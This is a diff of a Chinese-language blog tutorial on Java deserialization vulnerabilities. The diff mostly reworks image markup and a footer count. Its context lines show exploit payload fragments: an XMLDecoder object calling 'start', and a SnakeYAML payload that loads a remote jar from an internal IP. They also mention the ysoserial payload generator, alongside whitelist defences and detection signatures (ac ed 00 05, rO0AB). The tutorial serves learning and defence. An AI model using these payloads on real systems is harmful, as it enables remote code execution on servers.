@@ -380,7 +380,12 @@ defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>ObjectInputStream.readObject,将对象给恢复,调用恢复对象的readObject方法,执行命令
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_1.png" alt="|600"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_1.png" alt="|600" /><figcaption>|600</figcaption></figure>
+
+
+</p>
 <h4 id="xmldecoder">XMLDecoder</h4>
 <p>也是一样的,只不过是换成了xmldecode.readObject</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。在项目中应禁止使用XMLDecoder方式解析XML内容</span>
@@ -416,7 +421,12 @@ defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;void</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;start&#34;</span> <span style="color:#f92672">/&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/object&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/java&gt;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_2.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_2.png" alt="" /></figure>
+
+
+</p>
 <h4 id="snakeyaml">SnakeYaml</h4>
 <p>SnakeYAML 反序列化,
 SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
@@ -434,7 +444,12 @@ SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">!!java.net.URL</span> [<span style="color:#e6db74">&#34;http://192.168.10.7:8000/yaml-payload.jar&#34;</span>]
 </span></span><span style="display:flex;"><span>  ]]
 </span></span><span style="display:flex;"><span>]
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_3.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_3.png" alt="" /></figure>
+
+
+</p>
 <h3 id="安全代码">安全代码</h3>
 <h4 id="黑白名单">黑白名单</h4>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 使用Apache Commons IO的ValidatingObjectInputStream，accept方法来实现反序列化类白/黑名单控制</span>
@@ -474,12 +489,22 @@ SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
 白盒发现（特征类接口函数）</p>
 <h3 id="白盒">白盒</h3>
 <p>看是否用到了这些库,以及上面那些函数吧
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_4.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_4.png" alt="" /></figure>
+
+
+</p>
 <h3 id="黑盒">黑盒</h3>
 <p>黑盒的话看流量,看特征码
 java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，</p>
 <p>burp插件
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_5.png" alt="|600"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_5.png" alt="|600" /><figcaption>|600</figcaption></figure>
+
+
+</p>
 <p>需要配置一下ysoserial(一款java反序列化漏洞payload生成器)的路径</p>
 <h1 id="一句话总结">一句话总结</h1>
 <p>反序列化时会调用被反序列化对象的readObject方法,当这个方法被重写后,就会导致漏洞产生</p>
@@ -641,7 +666,7 @@ java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 85391 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 85604 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
